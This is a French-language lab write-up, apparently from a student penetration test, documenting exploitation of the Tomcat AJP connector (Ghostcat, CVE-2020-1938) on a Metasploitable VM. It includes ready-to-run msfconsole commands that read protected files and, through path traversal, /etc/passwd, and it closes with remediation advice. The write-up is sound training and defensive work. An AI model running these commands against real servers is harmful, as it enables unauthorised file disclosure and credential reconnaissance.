AJP13 — Lecture de fichiers arbitraires via le connecteur Tomcat

Technique "Ghostcat" fonctionnelle malgré une cible officiellement hors de la plage de versions vulnérables

Service / PortAJP13 (connecteur Tomcat) — port 8009
CibleMetasploitable 1 — 192.168.56.102
CVECVE-2020-1938 (Ghostcat) — plage officielle non couverte ici, voir §2
RésultatLecture arbitraire de fichiers (dont /etc/passwd)
Testé parZANNOU Josaphat
Note réseau. Cette page utilise le réseau de Josaphat (vboxnet0) : cible 192.168.56.102. Côté Jules, le même service est sur 172.28.128.4. Même Tomcat 5.5 que tomcat.html (port 8180), mais surface d'attaque différente (le connecteur AJP, pas l'interface HTTP).

1. Identification

$ nmap -sC -sV -p 8009 192.168.56.102
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request

Le connecteur AJP13 de Tomcat 5.5 est exposé directement — il n'est pas censé être exposé publiquement : il sert normalement à la communication interne entre un serveur web frontal et Tomcat.

2. Méthode d'identification de la CVE et du module

Le parcours suggère de vérifier si une variante de Ghostcat s'applique, en notant qu'elle vise normalement des versions plus récentes. Vérification via la vraie source (pas de mémoire) :

$ msfconsole -q -x "info auxiliary/admin/http/tomcat_ghostcat; exit"
Description:
  In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to
  7.0.99, Tomcat shipped with an AJP Connector enabled by default...
References:
  https://nvd.nist.gov/vuln/detail/CVE-2020-1938

Plage officielle confirmée : Tomcat 7.0.0 à 9.0.30. La cible est en Tomcat 5.5, antérieure à toute cette plage. D'après la CVE officielle, ça ne devrait pas s'appliquer.

3. Démarche d'exploitation

Conformément à la méthodologie (vérifier plutôt que supposer), test effectif du module malgré la version :

$ msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS 192.168.56.102; set RPORT 8009; run; exit"
<web-app xmlns="http://java.sun.com/xml/ns/j2ee" ...>
  <display-name>Welcome to Tomcat</display-name>
  ...
[+] 192.168.56.102:8009 - File contents save to: /home/josa/.msf4/loot/...web.xml....txt
⚠️ Résultat surprenant. Le module a bien récupéré /WEB-INF/web.xml — un fichier protégé, normalement inaccessible depuis un navigateur HTTP classique — alors que la cible est largement antérieure à la plage officiellement couverte par CVE-2020-1938. La documentation du CVE dit explicitement "7.0+", et pourtant ça marche sur 5.5. Le mécanisme sous-jacent (le connecteur AJP traite les requêtes comme hautement fiables et résout le chemin demandé sans le restreindre correctement) est probablement présent bien avant Tomcat 7.0 — la plage "officielle" reflète ce qu'Apache a testé et corrigé au moment de la divulgation en 2020, pas forcément la totalité des versions réellement affectées.

Pour confirmer que ce n'est pas un hasard, test avec une traversée de chemin vers un fichier hors de l'application web :

$ msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS 192.168.56.102; set RPORT 8009; set FILENAME /../../../../../../etc/passwd; run; exit"
root:x:0:0:root:/root:/bin/bash
...
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
...
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash

/etc/passwd entier récupéré, confirmant une vraie lecture arbitraire de fichiers système, pas limitée au webapp.

4. Preuve d'accès obtenu

Lecture de /WEB-INF/web.xml (fichier protégé) et de /etc/passwd (hors webapp, traversal) toutes deux réussies. Pas de shell direct, mais une primitive de lecture arbitraire de fichiers confirmée, similaire en impact à ce qu'on a vu sur MySQL (mysql.html) — exfiltration de fichiers sensibles, recoupement des comptes système déjà connus.

5. Remédiation

RECOMMANDATIONS
  • Ne jamais exposer le connecteur AJP sur une interface publique — cause racine, rappelée explicitement par la documentation Tomcat elle-même. Le limiter à localhost ou le désactiver si inutilisé.
  • Mettre à jour Tomcat : la 5.5 est obsolète depuis longtemps et partage des faiblesses structurelles avec les versions officiellement vulnérables.
  • Si le connecteur AJP est nécessaire (reverse proxy en frontal), le protéger par un secret partagé (requiredSecret) et le restreindre par pare-feu.
  • Ne pas se fier uniquement au numéro de version pour écarter une faille : tester activement quand c'est faisable, comme fait ici.
